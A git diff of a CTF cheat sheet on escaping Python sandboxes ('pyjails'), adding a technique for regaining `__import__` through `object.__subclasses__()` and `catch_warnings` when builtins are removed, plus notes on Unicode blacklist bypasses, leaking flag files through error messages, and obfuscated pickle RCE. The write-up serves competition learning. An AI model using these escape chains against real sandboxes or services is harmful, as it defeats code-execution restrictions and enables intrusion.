@@ -10,7 +10,7 @@ A PyJail, or Python Jail, refers to a restricted Python environment designed to 
 ### Unicode bypass 😈😈😈
 Probably the most straightforward way of escaping a pyjail if a SKID wrote it.  
 
-Python normalises italics for some reason, but the characters don't match your normal ASCII table, so standard blacklists won't work.  
+Python normalises italics for some reason, but the characters don't match your normal ASCII table, so standard blacklists can be easily bypassed.  
 
 Note that symbols still remain the same.  
 
@@ -41,13 +41,33 @@ Python Interactive mode
 `open('flag.txt').read()` (H2 computing doesn't recommend this)
 
 But what if `print()` isn't available...?
-- `help()`, `quit()`, `exit()`: essentially a one-time `print()`
+- `help()`, `exit()`, `quit()`: essentially `print()`
 
 But what if `read()` isn't accessible? Redirect to `stderr`!
 1. unpack your file object into a string: `*open('flag.txt')`
 2. then run a faulty conversion!: `int()`, `float()`, `complex()`
 
 ### No builtins???
+Some pyjails may (attempt to) remove `__builtins__` entirely as shown below.  
+
+```python
+eval(code, {"__builtins__": None})
+```
+
+Luckily, we can still bypass this! 
+
+```python
+().__class__.__base__.__subclasses__()
+```
+
+This essentially accesses all subclasses that inherit from the `object` class (ie. EVERY class defined in Python!)
+
+From here, we can access previously restricted functions through some helpful classes.
+
+Here, we access the `warnings` base class from the `catch_warnings` subclass, from which we can then call the `__import__` function.  
+```python
+[c for c in ().__class__.__base__.__subclasses__() if "catch" in c.__name__][0]()._module.__builtins__["__import__"]
+```
 
 ### NO PARENTHESES??? 💔💔💔
 Probably the most troublesome to bypass...  
@@ -64,6 +84,8 @@ class C:
 Setting a `__builtins__` function to `None` completely removes the global reference to it (eg. `__builtins__.eval = None`)  
 
 Honestly nothing you can do about it brotato chip ✌🥀, just find another entry point.  
+
+### Reading variables
 
 ### More stuff
 Dynamically accessing attributes
@@ -93,3 +115,9 @@ class Exploit():
 
 payload = pickle.dumps(Exploit())
 ```
+
+### Pickle RCE blacklist??? 😱😱😱
+Once a blacklist is introduced, things won't be as straightforward.  
+Luckily, we can use [Pickora](https://github.com/splitline/Pickora) to convert our obfuscated Python code to Pickle bytecode.  
+
+Read [this article](https://github.com/maurosoria/dirsearch/issues/1073) for more info.  
